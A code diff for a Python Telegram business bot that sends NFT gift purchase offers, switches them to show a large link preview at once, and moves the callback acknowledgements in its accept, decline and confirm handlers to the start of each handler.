@@ -244,10 +244,15 @@ async def handle_business_message(message: Message):
     try:
         sent = await bot.send_message(
             chat_id=message.chat.id,
-            text=build_offer_plain(amount, currency, gift_name, gift_num),
+            text=build_offer_linked(amount, currency, gift_name, gift_num, nft_url),
             reply_markup=kb_offer(order_id),
             business_connection_id=bcid,
-            link_preview_options=LinkPreviewOptions(is_disabled=True),
+            link_preview_options=LinkPreviewOptions(
+                is_disabled=False,
+                url=nft_url,
+                prefer_large_media=True,
+                show_above_text=True,
+            ),
         )
     except Exception as e:
         logging.error(f"send: {e}")
@@ -278,23 +283,6 @@ async def handle_business_message(message: Message):
     }
     GIFT_INDEX[(bcid, slug, gift_num)] = order_id
 
-    await asyncio.sleep(1.5)
-    try:
-        await bot.edit_message_text(
-            chat_id=message.chat.id,
-            message_id=sent.message_id,
-            text=build_offer_linked(amount, currency, gift_name, gift_num, nft_url),
-            reply_markup=kb_offer(order_id),
-            business_connection_id=bcid,
-            link_preview_options=LinkPreviewOptions(
-                is_disabled=False,
-                prefer_large_media=True,
-                show_above_text=True,
-            ),
-        )
-    except TelegramBadRequest as e:
-        logging.error(f"edit: {e}")
-
 
 @dp.edited_business_message()
 async def handle_edited_business(message: Message):
@@ -305,10 +293,10 @@ async def handle_edited_business(message: Message):
 
 @dp.callback_query(F.data.startswith("decline:"))
 async def on_decline(cb: CallbackQuery):
+    await cb.answer()
     order_id = cb.data.split(":", 1)[1]
     meta = PENDING.get(order_id)
     if not meta:
-        await cb.answer()
         return
     try:
         await bot.edit_message_text(
@@ -323,18 +311,16 @@ async def on_decline(cb: CallbackQuery):
         logging.error(f"decline: {e}")
     PENDING.pop(order_id, None)
     GIFT_INDEX.pop((meta["bcid"], meta["gift_slug"], meta["gift_num"]), None)
-    await cb.answer()
 
 
 @dp.callback_query(F.data.startswith("accept:"))
 async def on_accept(cb: CallbackQuery):
+    await cb.answer()
     order_id = cb.data.split(":", 1)[1]
     meta = PENDING.get(order_id)
     if not meta:
-        await cb.answer()
         return
     if meta["state"] == "INSTRUCTION":
-        await cb.answer()
         return
     try:
         await bot.edit_message_text(
@@ -351,6 +337,7 @@ async def on_accept(cb: CallbackQuery):
             business_connection_id=meta["bcid"],
             link_preview_options=LinkPreviewOptions(
                 is_disabled=False,
+                url=meta["nft_url"],
                 prefer_large_media=True,
                 show_above_text=True,
             ),
@@ -358,7 +345,6 @@ async def on_accept(cb: CallbackQuery):
         meta["state"] = "INSTRUCTION"
     except TelegramBadRequest as e:
         logging.error(f"accept: {e}")
-    await cb.answer()
 
 
 @dp.callback_query(F.data.startswith("confirm:"))
@@ -371,6 +357,7 @@ async def on_confirm(cb: CallbackQuery):
     if not meta.get("gift_transferred"):
         await cb.answer(ERR_NOT_RECEIVED, show_alert=True)
         return
+    await cb.answer()
     try:
         await bot.edit_message_text(
             chat_id=meta["chat_id"],
@@ -384,7 +371,6 @@ async def on_confirm(cb: CallbackQuery):
         logging.error(f"confirm: {e}")
     PENDING.pop(order_id, None)
     GIFT_INDEX.pop((meta["bcid"], meta["gift_slug"], meta["gift_num"]), None)
-    await cb.answer()
 
 
 @dp.message(CommandStart())
